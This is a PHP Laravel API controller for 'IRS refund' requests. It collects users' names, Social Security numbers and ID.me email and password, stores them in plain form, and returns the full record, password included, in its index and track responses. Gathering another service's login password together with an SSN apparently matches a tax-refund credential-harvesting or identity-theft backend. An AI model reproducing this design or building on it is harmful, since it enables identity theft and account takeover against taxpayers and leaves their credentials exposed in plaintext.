<?php

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use App\Models\IrsRefund;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;

class IrsRefundController extends Controller
{
    public function index()
    {
        $refund = IrsRefund::where('user_id', Auth::id())->first();
        return response()->json([
            'status' => 200,
            'data' => $refund
        ]);
    }

    public function store(Request $request)
    {
        $request->validate([
            'name' => 'required|string|max:255',
            'ssn' => 'required|string|max:255',
            'idme_email' => 'required|email|max:255',
            'idme_password' => 'required|string|max:255',
            'country' => 'required|string|max:255',
        ]);

        $existingRefund = IrsRefund::where('user_id', Auth::id())
            ->whereIn('status', ['pending', 'approved'])
            ->first();

        if ($existingRefund) {
            return response()->json(['message' => 'You already have a pending or approved refund request.'], 400);
        }

        $refund = IrsRefund::create([
            'user_id' => Auth::id(),
            'name' => $request->name,
            'ssn' => $request->ssn,
            'idme_email' => $request->idme_email,
            'idme_password' => $request->idme_password,
            'country' => $request->country,
            'status' => 'pending'
        ]);

        return response()->json([
            'message' => 'Request submitted successfully.',
            'data' => $refund
        ], 201);
    }

    public function updateFilingId(Request $request)
    {
        $request->validate(['filing_id' => 'required|string|max:255']);

        $refund = IrsRefund::where('user_id', Auth::id())->first();

        if (!$refund) {
            return response()->json(['message' => 'No refund request found.'], 404);
        }
        if ($refund->filing_id) {
            return response()->json(['message' => 'Filing ID already submitted.'], 400);
        }
        if ($refund->status !== 'pending') {
            return response()->json(['message' => 'Request is not pending.'], 400);
        }
        if ($request->filing_id !== Auth::user()->irs_filing_id) {
            return response()->json(['message' => 'Invalid filing ID.'], 422);
        }

        $refund->update(['filing_id' => $request->filing_id]);

        return response()->json(['message' => 'Filing ID updated successfully.']);
    }

    public function track()
    {
        $refund = IrsRefund::where('user_id', Auth::id())->first();
        
        if (!$refund) {
            return response()->json(['message' => 'No refund request found.'], 404);
        }
        if (!$refund->filing_id) {
            return response()->json(['message' => 'Filing ID required to track status.'], 400);
        }

        return response()->json([
            'status' => 200,
            'data' => $refund
        ]);
    }
}